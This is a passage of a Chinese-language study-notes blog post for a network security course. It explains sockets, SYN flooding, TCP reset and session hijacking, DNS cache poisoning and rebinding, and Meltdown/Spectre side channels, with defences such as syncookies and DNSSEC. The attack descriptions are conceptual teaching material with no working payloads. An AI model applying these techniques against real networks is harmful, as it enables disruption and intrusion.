class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dest</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;dest,<span class="number">0</span>,<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in));</span><br><span class="line">dest.sin_family=AF_INET;</span><br><span class="line">dest.sin_addr.s_addr=inet_addr(<span class="string">&quot;1.1.1.1&quot;</span>);</span><br><span class="line">dest.sin_port=htons(<span class="number">8080</span>);</span><br><span class="line">connect(sockfd,(<span class="keyword">struct</span> sockaddr*)&amp;dest,<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in));</span><br><span class="line"><span class="type">char</span> *buf=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">write(sockfd,buf,<span class="built_in">strlen</span>(buf));</span><br></pre></td></tr></table></figure><p>服务器端：</p><ul><li>1.创建套接字；</li><li>2.绑定到端口；</li><li>3.监听连接；</li><li>4.接受连接请求；</li><li>5.发送和接收数据</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> sockfd=socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">myaddr</span>,<span class="title">client_addr</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;myaddr,<span class="number">0</span>,<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in));</span><br><span class="line">myaddr.sin_family=AF_INET;</span><br><span class="line">myaddr.sin_port=htons(<span class="number">8080</span>);</span><br><span class="line">bind(sockfd,(<span class="keyword">struct</span> sockaddr*)&amp;myaddr,<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in));</span><br><span class="line">listen(sockfd,<span class="number">5</span>);</span><br><span class="line"><span class="type">int</span> client_len=<span class="keyword">sizeof</span>(client_addr);</span><br><span class="line">newsockfd=accept(sockfd,(<span class="keyword">struct</span> sockaddr*)&amp;client_addr,&amp;client_len);</span><br></pre></td></tr></table></figure><p>要接受多个连接可以采用fork多进程、pthread多线程、select轮询等方法，</p><p>以fork为例：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    newsockfd=accept(sockfd,(<span class="keyword">struct</span> sockaddr*)&amp;client_addr,&amp;client_len);</span><br><span class="line">    <span class="keyword">if</span>(fork()==<span class="number">0</span>)&#123;</span><br><span class="line">        close(sockfd);</span><br><span class="line">        <span class="built_in">memset</span>(read_buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(read_buf));</span><br><span class="line">        <span class="type">int</span> len=read(newsockfd,read_buf,<span class="number">100</span>);</span><br><span class="line">        close(newsockfd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;ekse&#123;</span><br><span class="line">        close(newsockfd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="TCP报文"><a href="#TCP报文" class="headerlink" title="TCP报文"></a>TCP报文</h2><ul><li>seq序列号，如果设置了SYN位，则为初始序列号</li><li>ack确认号，等于发送方期望的下一个序列号的值</li></ul><h2 id="TCP三次握手"><a href="#TCP三次握手" class="headerlink" title="TCP三次握手"></a>TCP三次握手</h2><p><img src="/./attachments/image-20221231152310873-20250103172555913.png" alt="image-20221231152310873"></p><ol><li>SYN包，客户端使用随机生成的数字x作为序列号</li><li>SYN+ACK，服务器端使用随机生成的数字y作为序列号</li><li>ACK，客户端确认，结束握手</li></ol><h2 id="SYN-Flooding"><a href="#SYN-Flooding" class="headerlink" title="SYN Flooding"></a>SYN Flooding</h2><p>当服务器接收到初始SYN数据包时，它使用TCB（传输控制块）存储有关连接的 信息。服务器将TCB存储在仅用于半开放连接的队列中。在服务器获得ACK数据包后，它将把这个TCB从队列中取出并存储在另一个地方 。如果ACK没有到达，服务器将重新发送SYN+ACK数据包。一段时间后，TCB最终将 被丢弃。</p><p>攻击原理：持续向服务器发送大量 SYN数据包。这会通过插入TCB记录来消耗队列 中的空间。最终服务器端没有空间为任何新的半开放连接存储TCB，导致无法接收新的客户端连接请求。</p><p>ps.使用随机的源IP</p><p>防范：<strong>syncookies</strong>。在服务器接收到SYN数据包后，它使用只有服务器知道的密钥从数据包中的信息 计算密钥散列（H）。此哈希（H）作为初始序列号从服务器发送到客户端。服务器不会将半开放连接存储在其队列中。服务器通过重新计算cookie来检查确认字段中的数字是否有效。</p><h2 id="TCP重置攻击"><a href="#TCP重置攻击" class="headerlink" title="TCP重置攻击"></a>TCP重置攻击</h2><p>断开TCP连接：</p><ul><li>FIN四次挥手</li><li>RST：通信一方发送RST立刻断开连接</li></ul><p>伪造<strong>RST</strong>数据包需要**<u>正确设置序列号和确认号</u>**（这也解释了为什么task3和task4内的序列号和确认号要求使用最新的tcp报文）</p><h2 id="TCP会话劫持攻击"><a href="#TCP会话劫持攻击" class="headerlink" title="TCP会话劫持攻击"></a>TCP会话劫持攻击</h2><p>在已建立连接中注入数据。伪造数据包需要正确设置序列号和确认号，具体见实验。</p><h3 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h3><p>劫持连接后运行的最佳命令是运行反向shell命令。<img src="/./attachments/image-20221231154243907-20250103172556027.png" alt="image-20221231154243907"></p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul><li>使攻击者难以伪造数据包<ul><li>随机化源端口号</li><li>随机化初始序列号</li><li>对本地攻击无效</li></ul></li><li>加密有效载荷</li></ul></blockquote><h2 id="6-3-DNS攻击"><a href="#6-3-DNS攻击" class="headerlink" title="6.3.DNS攻击"></a>6.3.DNS攻击</h2><p>（域名结构、查询过程、DNS攻击类型及原理（本地DNS缓存中毒攻击、远程DNS缓存中毒攻击、恶意DNS服务器的回复伪造攻击、DNS重绑定攻击）、防范措施）</p><p>（看看ppt的那个“攻击面概述”那一页，有一个图！）</p><p>本地DNS缓存中毒攻击、远程DNS缓存中毒攻击、恶意DNS服务器的回复伪造攻击、DNS重绑定攻击（也需要看看ppt！）</p><h3 id="6-3-1-域名层次结构"><a href="#6-3-1-域名层次结构" class="headerlink" title="6.3.1.域名层次结构"></a>6.3.1.域名层次结构</h3><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-30 11.01.57.png" alt="截屏2024-12-30 11.01.57" style="zoom: 33%;" /><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-30 11.15.20.png" alt="截屏2024-12-30 11.15.20" style="zoom: 33%;" /><p>域名称空间以层次树状结构组织。每个节点称为域或子域。</p><ul><li><p>域的根称为<strong>根</strong>，表示为“.”</p></li><li><p>在根目录下，我们有<strong>顶级域(TLD)</strong>。例如:在<a href="http://www.example/">www.example</a>. com中，TLD是.com。</p><ul><li><p>顶级域（TLD）</p><ul><li><p>基础结构TLD: .arpa</p></li><li><p>通用TLD（gTLD）: .com、.net、,</p></li><li><p>赞助TLD（sTLD）: 这些域名由私人机构或组织提议和赞助，这些机构或组织制定并实施限制TLD使用资格的规则: .edu、.gov、.mil、.travel、.jobs</p></li><li><p>国家代码TLD（ccTLD）: .au（澳大利亚）, .cn（中国）, .fr（法国）</p></li><li><p>calhost、.invalid</p></li></ul></li></ul></li><li><p>域层次结构的下一级是<strong>第二级域</strong>，通常分配给特定实体，如公司、学校等。</p></li></ul><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-30 13.36.56.png" alt="截屏2024-12-30 13.36.56" style="zoom: 33%;" /><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-30 11.09.00.png" alt="截屏2024-12-30 11.09.00" style="zoom: 33%;" /><blockquote><p>权威名称服务器：每个DNS区域至少有一个权威名称服务器，用于发布有关该区域的信息。它提供了DNS查询的原始和最终答案。权威名称服务器可以是主服务器（主服务器）或从服务器（辅助服务器）。主服务器存储所有区域记录的主副本，而从服务器使用自动更新机制来维护主记录的相同副本。</p><p>DNS根服务器：根区域称为root。此区域有13个权威名称服务器（DNS根服务器）。它们提供有关所有TLD的名称服务器信息。 它们是DNS查询的起点。</p></blockquote><h3 id="6-3-2-查询过程"><a href="#6-3-2-查询过程" class="headerlink" title="6.3.2.查询过程"></a>6.3.2.查询过程</h3><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-30 11.10.22.png" alt="截屏2024-12-30 11.10.22" style="zoom: 33%;" /><p>查询过程：用户–本地DNS服务器–因特网上的DNS SERVER</p><h4 id="6-3-2-1-用户本地DNS文件"><a href="#6-3-2-1-用户本地DNS文件" class="headerlink" title="6.3.2.1.用户本地DNS文件"></a>6.3.2.1.用户本地DNS文件</h4><ul><li>&#x2F;etc&#x2F;hosts: 存储某些主机名的IP地址。在计算机联系本地DNS服务器之前，它首先在该文件中查找IP地址。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 localhost</span><br><span class="line">127.0.0.1 www.CSRFLabAttacker.com</span><br><span class="line">127.0.0.1 www.CSRFLabElgg.com</span><br><span class="line">127.0.0.1 www.XSSLabElgg.com</span><br></pre></td></tr></table></figure><ul><li>&#x2F;etc&#x2F;resolv.conf: 向计算机的DNS解析器提供有关本地DNS服务器地址的信息。DHCP提供的本地DNS服务器的IP地址也存储在这里。</li></ul><h4 id="6-3-2-2-递归-迭代"><a href="#6-3-2-2-递归-迭代" class="headerlink" title="6.3.2.2.递归 &amp; 迭代"></a>6.3.2.2.递归 &amp; 迭代</h4><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-30 11.16.23.png" alt="截屏2024-12-30 11.16.23" style="zoom: 33%;" /><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-30 11.16.39.png" alt="截屏2024-12-30 11.16.39" style="zoom: 33%;" /><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-30 11.21.02.png" alt="截屏2024-12-30 11.21.02" style="zoom: 33%;" /><h4 id="6-3-2-3-DNS响应中有4种类型的节"><a href="#6-3-2-3-DNS响应中有4种类型的节" class="headerlink" title="6.3.2.3.DNS响应中有4种类型的节"></a>6.3.2.3.DNS响应中有4种类型的节</h4><p>问题部分：向名称服务器描述问题。</p><p>回答部分：回答问题的记录。</p><p>权威部分：指向权威名称服务器的记录。</p><p>附加部分：与查询相关的记录。</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-30 11.27.24.png" alt="截屏2024-12-30 11.27.24" style="zoom: 33%;" /><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-30 11.27.35.png" alt="截屏2024-12-30 11.27.35" style="zoom: 33%;" /><h4 id="6-3-2-4-DNS缓存"><a href="#6-3-2-4-DNS缓存" class="headerlink" title="6.3.2.4.DNS缓存"></a>6.3.2.4.DNS缓存</h4><p>当本地DNS服务器从其他DNS服务器获取信息时，它会缓存该信息。</p><p>缓存中的每一条信息都有一个生存时间值，最终将超时并从缓存中删除。</p><h3 id="6-3-3-DNS攻击类型及原理"><a href="#6-3-3-DNS攻击类型及原理" class="headerlink" title="6.3.3.DNS攻击类型及原理"></a>6.3.3.DNS攻击类型及原理</h3><p>（本地DNS缓存中毒攻击、远程DNS缓存中毒攻击、恶意DNS服务器的回复伪造攻击、DNS重绑定攻击）</p><p>（看看ppt的那个“攻击面概述”那一页，有一个图！）</p><p>本地DNS缓存中毒攻击、远程DNS缓存中毒攻击、恶意DNS服务器的回复伪造攻击、DNS重绑定攻击（也需要看看ppt！）</p><p><strong>DNS攻击类型及原理：</strong></p><p><strong>类型</strong>：DNS放大攻击、DNS缓存中毒、DNS隧道、僵尸网络反向代理、DNS劫持&#x2F;重定向</p><ul><li><p>拒绝服务攻击（DoS）：当本地DNS服务器和权威名称服务器不响应DNS查询时，计算机无法检索IP地址，这从本质上减少了通信。</p></li><li><p>DNS欺骗主要目标：向受害者提供欺诈性IP地址，诱使他们与不同于他们意图的机器进行通信。</p></li></ul><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-30 11.57.36.png" alt="截屏2024-12-30 11.57.36" style="zoom: 33%;" /><p>受损机器上的DNSATTACK</p><ul><li>如果攻击者获得了机器的根权限，</li><li>修改 &#x2F;etc&#x2F;resolv.conf：使用恶意DNS服务器作为机器的本地DNS服务器，并可以控制整个DNS进程。</li><li>修改 &#x2F;etc&#x2F;hosts：向文件中添加新记录，提供某些选定域的IP地址。例如，攻击者可以修改<code>www.bank32.com</code>的IP地址，这可能导致攻击者的机器。</li></ul><h4 id="6-3-3-1-本地DNS缓存中毒攻击"><a href="#6-3-3-1-本地DNS缓存中毒攻击" class="headerlink" title="6.3.3.1.本地DNS缓存中毒攻击"></a>6.3.3.1.本地DNS缓存中毒攻击</h4><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-30 12.02.38.png" alt="截屏2024-12-30 12.02.38" style="zoom: 33%;" /><p>（具体见实验）</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-30 12.14.31.jpg" alt="截屏2024-12-30 12.14.31" style="zoom: 33%;" /><h4 id="6-3-3-2-远程DNS缓存中毒攻击"><a href="#6-3-3-2-远程DNS缓存中毒攻击" class="headerlink" title="6.3.3.2.远程DNS缓存中毒攻击"></a>6.3.3.2.远程DNS缓存中毒攻击</h4><p>挑战：对于与本地DNS服务器不在同一网络上的远程攻击者，欺骗回复要困难得多，因为他们需要猜测查询数据包使用的两个随机数：源端口号（16位随机数）、事务ID（16位随机数）</p><p>缓存效果：如果一次尝试失败，local DNS将缓存实际回复；攻击者需要等待缓存超时以进行下一次尝试。（我们如何在不担心缓存效应的情况下不断伪造 回复？ 卡明斯基攻击）</p><p><strong>卡明斯基攻击思路</strong>：每次询问不同的问题，因此缓存答案并不重要，并且本地DNS服务器每次都会发送一个新的查询。在授权部分提供伪造答案，修改权威服务器的值</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-30 12.20.26.png" alt="截屏2024-12-30 12.20.26" style="zoom: 33%;" /><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-30 12.23.31.png" alt="截屏2024-12-30 12.23.31" style="zoom: 33%;" /><blockquote><p>权威部分：指向权威名称服务器的记录</p></blockquote><p>权威部分的假数据。</p><h4 id="6-3-3-3-恶意DNS服务器的回复伪造攻击"><a href="#6-3-3-3-恶意DNS服务器的回复伪造攻击" class="headerlink" title="6.3.3.3.恶意DNS服务器的回复伪造攻击"></a>6.3.3.3.恶意DNS服务器的回复伪造攻击</h4><p>当用户访问网站（如attacker32.com）时，DNS查询最终将到达attacker32.com域的权威名称服务器。除了在响应的应答部分提供IP地址外，DNS服务器还可以在<strong>授权和其他部分</strong>提供信息。攻击者可以使用这些部分提供欺诈信息。</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-30 13.34.52.png" alt="截屏2024-12-30 13.34.52" style="zoom: 33%;" /><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-30 13.35.19.png" alt="截屏2024-12-30 13.35.19" style="zoom: 33%;" /><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-30 13.36.23.png" alt="截屏2024-12-30 13.36.23" style="zoom: 33%;" /><blockquote><p>反向查找中，DNS查询尝试查找给定IP地址的主机名。</p></blockquote><p>Q：我们可以使用从反向DNS查找获得的主机名作为访问控制的基础吗?</p><p>A：如果数据包来自攻击者，则反向DNS查找将返回到攻击者的名称服务器。攻击者可以使用他们想要的任何主机名进行回复。（不能！！！）</p><h4 id="6-3-3-4-DNS重绑定攻击"><a href="#6-3-3-4-DNS重绑定攻击" class="headerlink" title="6.3.3.4.DNS重绑定攻击"></a>6.3.3.4.DNS重绑定攻击</h4><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-30 13.55.43.png" alt="截屏2024-12-30 13.55.43" style="zoom: 33%;" /><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-30 13.56.33.png" alt="截屏2024-12-30 13.56.33" style="zoom: 33%;" /><p>在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的（浏览器同源策略：协议、域名、端口同）。这就是DNS Rebinding攻击。</p><h4 id="6-3-3-5-DNS上的拒接服务攻击"><a href="#6-3-3-5-DNS上的拒接服务攻击" class="headerlink" title="6.3.3.5.DNS上的拒接服务攻击"></a>6.3.3.5.DNS上的拒接服务攻击</h4><p><strong>对根服务器的拒绝服务攻击</strong></p><ul><li><p>对根服务器和TLD服务器的攻击:</p></li><li><p>根名称服务器: 如果攻击者能够关闭根区域的服务器,则可以关闭整个Internet。但是，攻击根服务器很困难:</p><ul><li>根名称服务器是高度分布式的。有13(A, B·······M)个根名称服务器(服务器场),由大量冗余计算机组成，以提供可靠的服务。</li><li>由于TLD的名称服务器通常缓存在本地DNS服务器中，因此在缓存过期(48小时)之前不需要查询根服务器。对根服务器的攻击必须持续很长时间才能看到显著效果。</li></ul></li></ul><p><strong>特定名称服务器上的拒绝服务攻击</strong></p><ul><li>顶级域名（TLD）的名称服务器更容易受到攻击。TLD(如gov、com、net等)具有相当强的抵御DOS攻击的基础设施。但某些不太有名的TLD(如国家代码TLD)没有足够的框架结构。因此，攻击者可以关闭目标国家的互联网。</li></ul><h3 id="6-3-4-防范措施"><a href="#6-3-4-防范措施" class="headerlink" title="6.3.4.防范措施"></a>6.3.4.防范措施</h3><ul><li>DNSSEC</li></ul><p>DNSSEC是DNS的一组扩展，旨在对DNS数据提供<strong>身份验证和完整性检查</strong>。</p><p>使用DNSSEC，来自DNSSEC保护区的所有答案都经过<strong>数字签名</strong>。通过检查数字签名，DNS解析器能够检查信息是否真实。DNS缓存中毒将被此机制击败，因为将检测到任何虚假数据，因为它们将无法通过签名检查。</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-30 13.47.09.png" alt="截屏2024-12-30 13.47.09" style="zoom: 33%;" /><blockquote><p>这张图展示了如何使用DNSSEC（DNS Security Extensions，DNS安全扩展）来保护DNS查询的完整性和验证DNS记录的真实性。DNSSEC是一系列用于验证DNS数据包的起源和完整性的协议和技术。以下是图中各部分的解释：</p><ol><li><p><strong>Response from Root Server（根服务器的响应）</strong>：</p><ul><li><strong>DNSKEY</strong>: 根服务器的公钥，用于验证根服务器的响应。</li><li><strong>RRSIG</strong>: 该响应中记录的签名，用于验证记录的真实性。</li><li><strong>DS</strong>: 根服务器公钥的单向哈希值，用于验证.net服务器的公钥。</li></ul></li><li><p><strong>Response from .net Server（.net服务器的响应）</strong>：</p><ul><li><strong>DNSKEY</strong>: 该服务器的公钥，用于验证.net服务器的响应。</li><li><strong>RRSIG</strong>: 该响应中记录的签名。</li><li><strong>DS</strong>: .net服务器公钥的单向哈希值，用于验证example.net服务器的公钥。</li></ul></li><li><p><strong>Response from example.net Server（example.net服务器的响应）</strong>：</p><ul><li><strong>DNSKEY</strong>: 该服务器的公钥，用于验证example.net服务器的响应。</li><li><strong>RRSIG</strong>: 该响应中记录的签名。</li></ul></li><li><p><strong>Trusted information obtained from a different channel（从不同渠道获得的可信信息）</strong>：</p><ul><li>这指的是通过其他方式（如手动配置或证书颁发机构）获得的根服务器的公钥，用于验证整个DNSSEC链的起点。</li></ul></li></ol><p>整个流程是一个链式验证过程，从根服务器开始，逐级验证下一级服务器的公钥和签名，直到目标服务器。这样可以确保DNS查询的完整性和真实性，防止中间人攻击和DNS劫持。</p></blockquote><ul><li>使用TLS&#x2F;SSL</li></ul><p>传输层安全（TLS&#x2F;SSL）协议提供了针对缓存中毒攻击的解决方案。在使用DNS协议获取域名（<a href="http://www.example/">www.example</a>. Net）的IP地址后，计算机将询问IP地址的所有者（服务器）是否为<code>www.example.net</code>。服务器必须提供由受信任实体签名的<strong>公钥证书</strong>，并证明它知道与<code>www.example.net</code>关联的<strong>相应私钥（即它是证书的所有者</strong>）。HTTPS构建在TLS&#x2F;SSL之上。它可以击败DNS缓存中毒攻击。</p><ul><li><p>比较DNSSEC与TLS&#x2F;SSL</p><ul><li><p>DNSSEC和TLS&#x2F;SSL都基于<strong>公钥技术</strong>，但它们的信任链不同。</p></li><li><p>DNSSEC使用DNS区域层次结构提供信任链，因此<strong>父区域</strong>中的名称服务器为<strong>子区域</strong>中的名称服务器提供担保。</p></li><li><p>TLS&#x2F;SSL依赖于公钥基础设施，该基础设施包含为其他计算机提供担保的<strong>证书颁发机构</strong>。</p></li></ul></li></ul><h1 id="7-熔断和幽灵攻击"><a href="#7-熔断和幽灵攻击" class="headerlink" title="7.熔断和幽灵攻击"></a>7.熔断和幽灵攻击</h1><ul><li>CPU缓存原理<ul><li>（会考攻击原理，分片&#x2F;分块缓存！给一个区间，实验里能分几块）</li></ul></li><li><strong>侧通道攻击原理</strong></li><li><strong>熔断攻击思路</strong></li><li><strong>幽灵攻击思路</strong></li></ul><blockquote><p>2）乱序执行原理</p><p>乱序执行是一种应用在高性能微处理器中，利用指令周期以避免特定类型的延迟消耗的范式。处理器在一个由输入数据可用性所决定的顺序中执行指令，而不是由程序的原始数据所决定。在这种方式可以避免因获取下一条程序指令而引起处理器等待，从而处理下一条可以立即执行的指令。换言之，CPU不会严格的按照代码的顺序去依次执行程序，而是会乱序执行。</p><p>假设有3条语句：a. mov rax (rdx) | b. add rax $123 | c. mov rcx (rbx)</p><p>按顺序执行方式，CPU会依次执行这三条语句，先将内存中的数据放到rax中，在对rax中的数据做加法，再将rbx中的数据放到rcx中。可以发现，在c指令中需要加载的内存模块，在处理b指令时是闲置的，这是一种资源的浪费。而按乱序执行方式，CPU会在a执行结束后就将c中的数据加载到cache中，这样c语句的执行就会快很多。</p><p>需要注意，如果c语句访问的数据进程并不能修改，乱序执行仍会将其加载到cache中，在执行c语句时，操作系统进行权限的判断，发现进程并无权限，从而放弃乱序执行结果，重新回到初始状态依次执行，为漏洞攻击埋下伏笔。</p><p>3）分支预测原理</p><p>程序中的条件分支语句（如if - else和switch）会导致程序执行的不确定性。在程序运行时，计算机无法预先知道要执行哪一条路径，降低了程序运行效率。因此提出一种优化原理，即计算机系统可根据历史的分支执行信息，预测下一次分支的执行路径。计算机通过记录分支指令的历史行为，建立预测模型，并根据当前的上下文信息进行预测，这样计算机可提前决定执行哪一条路径上的指令，避免流水线的停顿，提高系统性能。</p><p>分支预测技术允许操作系统先将对应数据加载到cache中，若条件判断正确则执行主体语句，使主体语句可直接从cache而不是内存中读取数据。与乱序执行类似，但是如果分支预测失败，那么CPU的状态信息会被还原，但cache中数据保持不变，为漏洞攻击埋下伏笔。</p><p>4）熔断漏洞原理</p><p>熔断漏洞利用计算机系统<u>乱序执行</u>的方式，结合旁信道攻击原理推测出<u>内核地址内容</u>。上文提到过，乱序执行在发现进程并没有权限修改访问的数据时，会放弃乱序执行的结果，回到初始状态依次执行，此时cache中的信息没有被还原。之后我们通过旁信道攻击测试数据，发现对某个数据的访问要远远快于对其他数据的访问，则推知该数据存放在cache中，并可反推回其内存地址，以此推测出内核地址内容，攻击计算机。</p><p>5）幽灵漏洞原理</p><p>类似的，幽灵漏洞利用计算机系统<u>预测执行</u>的方式，结合旁信道攻击推测出<u>内核地址内容</u>。在执行分支判断前，CPU先将预测执行的数据加载到cache中，在发现分支预测错误时，会丢弃分支执行的结果，恢复CPU的状态，但不恢复Cache中存储内容。与熔断漏洞一样，幽灵漏洞也通过旁信道攻击来测试数据，当发现对某个数据的访问远远快于对其他数据的访问时，推知该数据在cache中，可反推其内存地址。</p><p><a href="https://blog.csdn.net/m0_73633523/article/details/135295320">https://blog.csdn.net/m0_73633523/article/details/135295320</a></p><p>熔断与幽灵漏洞分别利用计算机系统乱序执行和分支预测的原理，在发生错误恢复状态时，cache中的内容并不会被恢复，因此可结合旁信道攻击原理推测出内核地址内容，从而实现对计算机系统的攻击。</p></blockquote><h2 id="7-1-CPU缓存原理"><a href="#7-1-CPU缓存原理" class="headerlink" title="7.1.CPU缓存原理"></a>7.1.CPU缓存原理</h2><p>（会考攻击原理，分片&#x2F;分块缓存！给一个区间，实验里能分几块）</p><p>计算机在运行程序时，CPU要读取一个数据时，<strong>首先从缓存中查找</strong>，如果找到就立即送给CPU处理，缓存与CPU之间的数据交换速度要比CPU和内存之间快得多，如果CPU没有在缓存中找到需要的数据，就要慢速度<strong>从内存中读取</strong>并送给CPU处理，同时把这个数据所在的数据块调入缓存中。</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-30 14.28.55.png" alt="截屏2024-12-30 14.28.55" style="zoom: 33%;" /><h2 id="7-2-侧信道攻击原理"><a href="#7-2-侧信道攻击原理" class="headerlink" title="7.2.侧信道攻击原理"></a>7.2.侧信道攻击原理</h2><blockquote><p>侧信道攻击：如果CPU访问Cache中并 不存在的数据时，则将会产生时间延迟。测量这种时间延迟有可能让攻击者确定出Cache访问失败的发生和频率。</p></blockquote><p>侧信道密码分析利用密码系统实现时泄露的额外信息，推导密码系统中的秘密参数。特别地，最近几年，计算错误、执行时间、能量消耗、电磁辐射等侧信道得到了深入研究。</p><p>目前，大多数计算机在CPU和内存之间增加CPU缓存（Cache），采用这种体系结构可以显著提高程序的平均执行性能。<u>然而，如果CPU访问Cache中并不存在的数据时，则将会产生时间延迟，此时目标数据必须重新从内存加载到Cache中。测量这种时间延迟有可能让攻击者确定出Cache访问失败的发生和频率，这就是基于缓存的侧信道攻击的基本原理。</u></p><p>Flush-Reload 技术：刷新处理器缓存→访问存储器S位置（秘密s）→检查缓存中的是哪个</p><h2 id="7-3-熔断攻击思路"><a href="#7-3-熔断攻击思路" class="headerlink" title="7.3.熔断攻击思路"></a>7.3.熔断攻击思路</h2><p>在用户级别时先判断试图访问的空间是否非法，如果非法，则拒绝执行。Intel的熔断缺陷是，其处理器<strong>先进行猜想性访问，然后再去判断是否合法</strong>，如果不合法就消除影响。这个看似无辜的顺序颠倒虽然不影响最终计算结果，却产生了系统其他部分如<strong>缓存的变化</strong>，这种变化使攻击者能推导出本来被禁止读取的信息内容。</p><p>熔断漏洞利用计算机系统<strong>乱序执行</strong>的方式，结合侧信道攻击原理推测出<strong>内核地址内容</strong>。乱序执行在发现进程并没有权限修改访问的数据时，会放弃乱序执行的结果，回到初始状态依次执行，此时cache中的信息没有被还原。之后我们通过侧信道攻击测试数据，发现对某个数据的访问要远远快于对其他数据的访问，则推知该数据存放在cache中，并可反推回其内存地址，以此推测出内核地址内容，攻击计算机。</p><p>对策</p><ul><li>根本问题在于CPU硬件<ul><li>修理费用昂贵</li></ul></li><li>在操作系统中开发变通方法</li><li>KASLR（内核地址空间布局随机化）<ul><li>不映射用户空间中的任何内核内存，但x86体系结构所需的某些部分除外（例如，中断处理程序）</li><li>用户级程序不能直接使用内核内存地址，因为这样的地址无法解析</li></ul></li></ul><h2 id="7-4-幽灵攻击思路"><a href="#7-4-幽灵攻击思路" class="headerlink" title="7.4.幽灵攻击思路"></a>7.4.幽灵攻击思路</h2><p>（分支预测，无序执行）训练CPU执行某分支–刷新处理器缓存–引用受害者–重新加载检查缓存中的是哪一个</p><p>幽灵漏洞利用计算机系统<strong>预测执行</strong>的方式，结合侧信道攻击推测出<strong>内核地址内容</strong>。在执行分支判断前，CPU先将预测执行的数据加载到cache中，在发现分支预测错误时，会丢弃分支执行的结果，恢复CPU的状态，但不恢复cache中存储内容。与熔断漏洞一样，幽灵漏洞也通过侧信道攻击来测试数据，当发现对某个数据的访问远远快于对其他数据的访问时，推知该数据在cache中，可反推其内存地址。</p><p><strong>实验部分问答：</strong></p><p>因为if分支的判断语句最终会回滚到条件为假的语句，从而会返回一个0。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (x &lt;= bound_upper &amp;&amp; x &gt;= bound_lower) &#123;</span><br><span class="line"><span class="keyword">return</span> buffer[x];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-30 14.57.40.png" alt="截屏2024-12-30 14.57.40" style="zoom: 33%;" /><p>![截屏2024-12-30 14.57.18](.&#x2F;attachments&#x2F;截屏2024-12-30 14.57.18.png)</p><h1 id="8-追踪溯源"><a href="#8-追踪溯源" class="headerlink" title="8.追踪溯源"></a>8.追踪溯源</h1><h2 id="8-1-溯源概述"><a href="#8-1-溯源概述" class="headerlink" 